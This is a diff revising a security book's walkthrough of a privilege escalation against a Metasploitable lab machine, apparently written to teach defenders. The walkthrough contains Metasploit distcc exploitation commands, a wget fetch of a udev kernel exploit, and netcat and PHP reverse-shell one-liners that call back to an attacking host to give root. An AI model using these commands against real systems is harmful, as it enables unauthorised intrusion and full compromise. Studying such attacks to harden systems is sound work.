@@ -208,7 +208,7 @@ So for example if root owns a file and the file has its `suid` bit set, anyone c
 
 Just as I showed you in the Penetration Testing section of the Process and Practises chapter in Fascicle 0, we will now walk through the steps of how an attacker may carry out a privilege escalation. 
 
-You can find the video of how it is played out at [todo](todo).
+You can find the video of how it is played out at [https://youtu.be/ORey5Zmnmxo](https://youtu.be/ORey5Zmnmxo).
 
 I> ## Synopsis
 I>
@@ -233,7 +233,8 @@ G> `msf > db_rebuild_cache`
 G> `msf > search distcc`  
 G> `msf > use exploit/unix/misc/distcc_exec`  
 G> `msf exploit(distcc_exec) > set RHOST metasploitable`  
-G> `msf exploit(distcc_exec) > exploit`
+G> `msf exploit(distcc_exec) > exploit`  
+G> In the video metasploitable was running at 192.168.56.21 for starters. After this I had to change the virtual adapter, so that it could also connect to the outside world to fetch my payload. It ended up running on 192.168.0.232. My attacking machine also changed from 192.168.56.20 to 192.168.0.12
 G>
 G> Now we have a shell. Let us test it.
 G>
@@ -244,9 +245,8 @@ G> `daemon`
 G>
 G> All following commands can be run through our low privilege user.
 G>
-G> Running unix-privesc-check and directing the output to a file shows us:  
-G> {title="upc.output results", linenos=off, lang=bash}
-G>     I: [group_writable] /tmp is owned by user root (group root) and is group-writable (drwxrwxrwt)
+G> Running `unix-privesc-check` and directing the output to a file shows us:  
+G> `I: [group_writable] /tmp is owned by user root (group root) and is group-writable (drwxrwxrwt)`
 G>
 G> What about a file system that is mounted with permissions that will allow us to write a file that may be executed by one of the previously mentioned privileged services?  
 G>
@@ -258,7 +258,7 @@ G> Let us get the targets Kernel version:
 G> `uname -a`  
 G> `2.6.24`
 G>
-G> This (https://www.exploit-db.com/exploits/8572/) looks like an interesting one. Can we compile this on the target though? Let us see if we have `gcc` handy:
+G> This (https://www.exploit-db.com/exploits/8572/) looks like an interesting one. Can we compile this on the target though? Let us see if we have `gcc` handy:  
 G> `dpkg -l gcc`  
 G> We do.
 
@@ -269,11 +269,11 @@ G> which allowed users to supply their own, which we see in the exploit:
 G> `sendmsg(sock, &msg, 0);`
 G>
 G> The exploit will run our payload that we will create soon which will open a reverse root shell (because udev is running as root) back to our attacking box.  
-G> We need to pass the PID of the netlink socket as a argument.  
-G> When a device is removed, the exploit leverages the 95-udev-late.rules functionality which runs arbitrary commands (which we are about to create in /tmp/run) via `REMOVE_CMD`  
+G> We need to pass the PID of the netlink socket as an argument.  
+G> When a device is removed, the exploit leverages the `95-udev-late.rules` functionality which runs arbitrary commands (which we are about to create in `/tmp/run`) via the `REMOVE_CMD` in the exploit.  
 G> You can also see within the exploit that it adds executable permissions to our reverse shell payload. Now if we had `/tmp` mounted as we do in the `/etc/fstab` in the Countermeasures section, neither `/tmp/run` or `/tmp/privesc` would be able to execute.  
 G>
-G> Through our daemon shell that `distcc_exec` provided:  
+G> Through our daemon shell that `distcc_exec` provided, let us fetch the exploit:  
 G> `wget --no-check-certificate https://www.exploit-db.com/download/8572 -O privesc.c`  
 G> Now check that the file has the contents that you expect.  
 G> `cat privesc.c`
@@ -285,18 +285,18 @@ G> `privesc`
 G>
 G> Now we need the PID of the udevd netlink socket  
 G> `cat /proc/net/netlink`  
-G> Gives us `2302`  
+G> Gives us `2299`  
 G> And to check:  
 G> `ps -aux | grep udev`  
-G> Gives us `2303` which should be one more than netlink
+G> Gives us `2300` which should be one more than netlink.
 G>
 G> Now we need something on the target to use to open a reverse shell. Netcat may not be available on a production web server, but if it is:  
-G> Open a connection to 192.168.56.20:1234, then run `/bin/bash`  
+G> Open a connection to 192.168.0.12:1234, then run `/bin/bash`  
 G> `echo '#!/bin/bash' > run`  
-G> `echo '/bin/netcat -e /bin/bash 192.168.56.20 1234' >> run`  
+G> `echo '/bin/netcat -e /bin/bash 192.168.0.12 1234' >> run`  
 G> Another alternative is using php  
 G> `echo '#!/bin/bash' > run`  
-G> `echo "php -r '\$sock=fsockopen(\"192.168.56.20\",1234);exec(\"/bin/bash <&3 >&3 2>&3\");'" > run`  
+G> `echo "php -r '\$sock=fsockopen(\"192.168.0.12\",1234);exec(\"/bin/bash <&3 >&3 2>&3\");'" > run`  
 G> There are also many other options [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) to use for providing a reverse shell.
 
 {icon=bomb}
@@ -306,12 +306,13 @@ G> `nc -lvp 1234`
 G> `Listening on [any] 1234 ...`
 G>
 G> Now from our low privilege shell, user supplies message from user space (seen within the exploit) along with the PID of netlink:  
-G> `./privesc 2302`
+G> `./privesc 2299`
 G>
 G> You should see movement on the listening netcat now.  
-G> `connect to [192.168.56.20] from metasploitable [192.168.56.21] 43542`  
+G> `connect to [192.168.0.12] from metasploitable [192.168.0.232] 43542`  
 G> `whoami`  
 G> `root`
+G>
 G> and that is our privilege escalation, we now have root.
 
 The Countermeasures sections that address are:
